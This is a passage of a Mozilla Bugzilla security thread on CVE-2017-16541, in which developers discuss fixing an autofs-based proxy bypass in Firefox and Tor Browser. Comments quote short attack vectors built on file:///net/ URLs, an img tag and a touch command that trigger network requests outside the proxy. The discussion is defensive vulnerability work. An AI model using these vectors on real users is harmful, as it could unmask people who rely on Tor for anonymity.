          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a491926_269762"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" id="a491926_269762"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-43"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-43" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c43">Comment 43</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-01 14:22 PDT" data-time="1509571369">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-43">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-43" data-comment-id="12809917">(In reply to Arthur Edelstein (Tor Browser dev) [:arthuredelstein] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c42">comment #42</a>)
<span class="quote">&gt; A couple of much weaker attacks I noticed:
&gt; 1. The user could be induced to past file:///net/11.11.11.14/a.css into the
&gt; URL bar
&gt; 2. Open an html page with &lt;img src=&quot;file:///net/11.11.11.14/a.jpg&quot;&gt;. Now
&gt; choose Page Info, click on the item for the fake image, click &quot;Save As&quot; and
&gt; choose a location to save the file.
&gt; 
&gt; #1 is perhaps a concern. For #1 the most promising fix I can think of is to
&gt; blacklist URLs of the form &quot;file:///net/*&quot;.
&gt; 
&gt; #2 seems unlikely to be a very useful attack vector, but perhaps it would be
&gt; good to fix as well.</span >

Thanks for those points. Yes, those are scenarios the final patch has to address, I agree. Especially #1. I think, though, we could release an update without addressing them (I am building right now a new Tor Browser including your redirect patch as well *fingers crossed*).</pre></div><div class="change-set" id="c44"><div class="comment" data-id="12809935" data-no="44"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-44" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_20209" id="a491926_269762"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_20209" id="a491926_269762"><a class="email " href="/user_profile?user_id=20209" > <span class="fna">Boris Zbarsky [:bzbarsky]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-44"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-44" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c44">Comment 44</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-01 14:27 PDT" data-time="1509571659">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-44">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-44" data-comment-id="12809935"><span class="quote">&gt; I would imagine that the web never needs access to a local file</span >

You would imagine wrong.  See <a rel="nofollow" href="http://searchfox.org/mozilla-central/rev/aa1343961fca52e8c7dab16788530da31aab7c8d/caps/nsIScriptSecurityManager.idl#129-134">http://searchfox.org/mozilla-central/rev/aa1343961fca52e8c7dab16788530da31aab7c8d/caps/nsIScriptSecurityManager.idl#129-134</a> for example.

<span class="quote">&gt; Dan, under what circumstances do we want to allow an http redirect to a file?</span >

Again, see our explicit support for allowing some sites, controlled by prefs, to link to file:// URIs.

For the real underlying issue here, the basic problem is that file:// is so messed up, between symlinks, virtual filesystems, etc.  Some specific issues with them:

1)  Some of our security checks (e.g. CheckMayLoad) _require_ that symlinks be resolved 
    before a check is done, due to the fact that we treat files in the same dir as same-origin
    but symlinks can cross directory boundaries.  This obviously requires a stat().
2)  CheckMayLoad also needs to stat() files because it needs to treat file:///foo and file:///FOO
    as same-origin on case-insensitive filesystems.
3)  For this bug, it sounds like CheckLoadURI needs to happen _before_ we ever stat() the file.

This list is clearly not exhaustive.

To fix issues around symlinks, we resolve symlinks (and hence stat() the file) immediately in nsFileChannel::Init.  I urge everyone to read through <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - Arbitrary File + Directory read via .lnk files on Windows Share"
   href="/show_bug.cgi?id=670514">bug 670514</a> to see why doing it fully lazily (and not caching the stat() results) does not work.  That said, we could consider doing it as part of the AsyncOpen security-check process, instead of Init(), and make sure that it happens after the CheckLoadURI call.  I _think_ that should avoid regressing the issues from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - Arbitrary File + Directory read via .lnk files on Windows Share"
   href="/show_bug.cgi?id=670514">bug 670514</a> while allowing us to fix this bug.

I should note that until we moved CheckLoadURI into the channel code, this was slightly less of an issue, because we did not create the channel until _after_ CheckLoadURI passed.  I don't know whether CheckLoadURI still involved a stat() at that point or not.  We would need to check whether it does one.

We definitely need to ensure that we do not ever _read_ the file (including for &quot;symlink resolution&quot; or Windows equivalent) until after CheckLoadURI passes in the cases in which reading the file is already a failure (various /dev/tty bits on Linux, Windows special files that hang or crash the process when read, etc).

<span class="quote">&gt; 1. The user could be induced to past file:///net/11.11.11.14/a.css into the URL bar</span >

True.  The user could also be induced to paste &quot;touch /net/11.11.11.14/a.css&quot; into their terminal... I think fundamentally having autofs enabled is pretty prejudicial to fully controlling your network access.  :(

<span class="quote">&gt; Now choose Page Info, click on the item for the fake image, click &quot;Save As&quot; and choose a location to save the file.</span >

Right, there's a fundamental tension here between &quot;the page is not allowed to link there&quot; and &quot;the user wants to get the data&quot;...  It's worth looking at the history of whether page info ever enforced CheckLoadURI checks on the &quot;Save As&quot; functionality in its media tab and thinking about whether it should.</pre></div><div class="change-set" id="c45"><div class="comment" data-id="12810082" data-no="45"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-45" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_474980" id="a491926_269762"><img src="https://secure.gravatar.com/avatar/dfcd4ae2df9a810044e19c011304881e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_474980" id="a491926_269762"><a class="email " href="/user_profile?user_id=474980" > <span class="fna">Arthur Edelstein [:arthur]</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-45"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-45" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c45">Comment 45</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-01 15:03 PDT" data-time="1509573780">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-45">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-45" data-comment-id="12810082">(In reply to Patrick McManus [:mcmanus] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c37">comment #37</a>)
<span class="quote">&gt; Dan, under what circumstances do we want to allow an http redirect to a
&gt; file? I can't think of any off the top of my head (and didn't think we ever
&gt; allowed it.. but apparently that's not true.). We can certainly block it
&gt; right in the http channel code if there isn't some use case to support..</span >

Something interesting I observed is, without the patch in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c36">comment 36</a>, some UDP events are detected at the target server, but that is followed by a Security Error appearing in the web console claiming the redirect is not permitted. So it appears that the intention was already to cancel (most) redirects from http to file:///, but the cancellation happens too late to prevent some network leakage. So, in the final patch, the existing code that prevents redirects to file:/// and takes into account certain prefs as mentioned by Boris, perhaps needs to be refactored to a new location such that cancellation happens earlier.</pre></div><div class="change-set" id="c46"><div class="comment" data-id="12811078" data-no="46"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-46" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_363267" id="a491926_269762"><img src="https://secure.gravatar.com/avatar/72977b89c86da4a19d3cf1d5920ea341?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_363267" id="a491926_269762"><a class="email " href="/user_profile?user_id=363267" > <span class="fna">Christoph Kerschbaumer [:ckerschb]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-46"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-46" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c46">Comment 46</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-02 01:26 PDT" data-time="1509611173">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-46">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-46" data-comment-id="12811078">(In reply to Georg Koppen from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c34">comment #34</a>)
<span class="quote">&gt; The problem seems to be that the codebase principal check is failing in the
&gt; redirect case. Christoph: Do we have a different check we could use for both
&gt; redirect/non-redirect cases? Just using the triggering principal one and
&gt; preventing channel creation in that case already seems to be the nuclear
&gt; option as it makes file:// unusable.</span >

I think Boris added a bunch of very valuable information within <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c44">comment 44</a>. Probably it's best we don't do stat() within ::init() but instead rather move it to asyncOpen2. Or more precisely to the contentSecurityManager right after we preform the CheckLoadURI check.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(ckerschb)</span></div></div></div><div class="change-set" id="c47"><div class="comment" data-id="12812872" data-no="47"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-47" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_451704" id="a491926_269762"><img src="https://secure.gravatar.com/avatar/6168ea97fda0cefa449331e59b24e8f7?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_451704" id="a491926_269762"><a class="email " href="/user_profile?user_id=451704" > <span class="fna">Liz Henry (:lizzard Please n-i to RyanVM, jcristau, or pascal)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-47"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-47" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c47">Comment 47</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-02 11:46 PDT" data-time="1509648401">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-47">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-47" data-comment-id="12812872">Tracking this for 57. It's late in the release cycle but we could still uplift for the RC build(s).</pre><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox57&amp;o1=isnotempty">tracking-firefox57</a>:
          <a href="/buglist.cgi?f1=cf_tracking_firefox57&amp;o1=equals&amp;v1=%3F">?</a> &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox57&amp;o1=equals&amp;v1=%2B">+</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox58&amp;o1=isnotempty">tracking-firefox58</a>:
          <a href="/buglist.cgi?f1=cf_tracking_firefox58&amp;o1=equals&amp;v1=%3F">?</a> &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox58&amp;o1=equals&amp;v1=%2B">+</a></div></div></div><div class="change-set" id="c48"><div class="comment" data-id="12815085" data-no="48"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-48" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" id="a491926_269762"><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_537703" id="a491926_269762"><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-48"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-48" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c48">Comment 48</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-03 06:33 PDT" data-time="1509716002">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-48">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-48" data-comment-id="12815085">Apple requests that we not mention the sandbox-bypass with /net when this is resolved.</pre></div><div class="change-set" id="c49"><div class="comment" data-id="12815353" data-no="49"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-49" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a491926_269762"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" id="a491926_269762"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-49"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-49" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c49">Comment 49</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-03 08:06 PDT" data-time="1509721618">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-49">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-49" data-comment-id="12815353">(In reply to Alex Gaynor [:Alex_Gaynor] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c48">comment #48</a>)
<span class="quote">&gt; Apple requests that we not mention the sandbox-bypass with /net when this is
&gt; resolved.</span >

Which reminds me: shouldn't such a thing get caught by the Linux sandbox as well (ideally)?</pre></div><div class="change-set" id="c50"><div class="comment" data-id="12815360" data-no="50"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-50" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" id="a491926_269762"><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_537703" id="a491926_269762"><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-50"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-50" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c50">Comment 50</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-03 08:08 PDT" data-time="1509721693">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-50">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-50" data-comment-id="12815360">I would have expected it to, add :gcp to see what the deal is there.</pre></div><div class="change-set" id="a871613_151147"><div class="change" id="aa871613_151147">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151147" id="a871613_151147"><img src="https://secure.gravatar.com/avatar/6ad7e6f8a605ca81446ea4c83d819fb2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_151147" id="a871613_151147"><a class="email " href="/user_profile?user_id=151147" > <span class="fna">Gian-Carlo Pascutto [:gcp]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a871613_151147"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a871613_151147">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a871613_151147">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-05 13:32 PST" data-time="1509917547">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: needinfo?(gpascutto)</div></div></div><div class="change-set" id="a871758_151147"><div class="change" id="aa871758_151147">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151147" id="a871758_151147"><img src="https://secure.gravatar.com/avatar/6ad7e6f8a605ca81446ea4c83d819fb2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_151147" id="a871758_151147"><a class="email " href="/user_profile?user_id=151147" > <span class="fna">Gian-Carlo Pascutto [:gcp]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a871758_151147"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a871758_151147">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a871758_151147">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-05 13:34 PST" data-time="1509917692">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(gpascutto)</span></div></div></div><div class="change-set" id="a941200_580382"><div class="change" id="aa941200_580382">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_580382" id="a941200_580382"><img src="https://secure.gravatar.com/avatar/15b9b3783e4671cd882bff1316df14c9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_580382" id="a941200_580382"><a class="email " href="/user_profile?user_id=580382" > <span class="fna">Julien Cristau [:jcristau]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a941200_580382"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a941200_580382">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a941200_580382">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-06 08:52 PST" data-time="1509987134">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox57&amp;o1=isnotempty">status-firefox57</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox57&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox57&amp;o1=equals&amp;v1=wontfix">wontfix</a></div></div></div><div class="change-set" id="c51"><div class="comment" data-id="12821777" data-no="51"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-51" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151147" id="a941200_580382"><img src="https://secure.gravatar.com/avatar/6ad7e6f8a605ca81446ea4c83d819fb2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151147" id="a941200_580382"><a class="email " href="/user_profile?user_id=151147" > <span class="fna">Gian-Carlo Pascutto [:gcp]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-51"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-51" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c51">Comment 51</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-06 11:18 PST" data-time="1509995890">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-51">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-51" data-comment-id="12821777">From conversation, the Linux sandbox &quot;catches&quot; and blocks that stat() from content, but resolving what is actually being stat() to see if it's allowed leads to the information leak happening on the chrome side. Content will be told the path is not allowed but of course by then the damage is done.

It's reasonable suspect the macOS kernel bug works along similar lines.</pre></div><div class="change-set" id="a2204674_349211"><div class="change" id="aa2204674_349211">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a2204674_349211"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_349211" id="a2204674_349211"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a2204674_349211"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a2204674_349211">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a2204674_349211">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-20 23:50 PST" data-time="1511250608">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Summary: Proxy bypass caused by autofs on Mac, Linux &rarr; (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux</div></div></div><div class="change-set" id="a2242534_269762"><div class="change" id="aa2242534_269762">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_269762" id="a2242534_269762"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_269762" id="a2242534_269762"><a class="email " href="/user_profile?user_id=269762" > <span class="fna">Honza Bambas (:mayhemer)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a2242534_269762"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a2242534_269762">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a2242534_269762">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-21 10:21 PST" data-time="1511288468">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Priority: -- &rarr; P2</div><div class="change">Whiteboard: [tor][sec-critical for Tor] &rarr; [tor][sec-critical for Tor][necko-triaged]</div></div></div><div class="change-set" id="a2243361_269762"><div class="change" id="aa2243361_269762">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_269762" id="a2243361_269762"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_269762" id="a2243361_269762"><a class="email " href="/user_profile?user_id=269762" > <span class="fna">Honza Bambas (:mayhemer)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a2243361_269762"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a2243361_269762">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a2243361_269762">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-21 10:34 PST" data-time="1511289295">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">See Also:  &rarr; <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - proxy bypass on windows via smb"
   href="/show_bug.cgi?id=1413868">1413868</a></div></div></div><div class="change-set" id="c52"><div class="comment" data-id="12862962" data-no="52"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-52" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_269762" id="a2243361_269762"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_269762" id="a2243361_269762"><a class="email " href="/user_profile?user_id=269762" > <span class="fna">Honza Bambas (:mayhemer)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-52"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-52" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c52">Comment 52</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-21 10:37 PST" data-time="1511289462">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-52">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-52" data-comment-id="12862962">Are there strong voices against disabling file: URI loading *completely* via a preference that the Tor browser could set?  It would be a solution for similar <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - proxy bypass on windows via smb"
   href="/show_bug.cgi?id=1413868">bug 1413868</a> too.</pre></div><div class="change-set" id="c53"><div class="comment" data-id="12862994" data-no="53"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-53" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_20209" id="a2243361_269762"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_20209" id="a2243361_269762"><a class="email " href="/user_profile?user_id=20209" > <span class="fna">Boris Zbarsky [:bzbarsky]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-53"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-53" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c53">Comment 53</a>
          </h3>
          &bull;
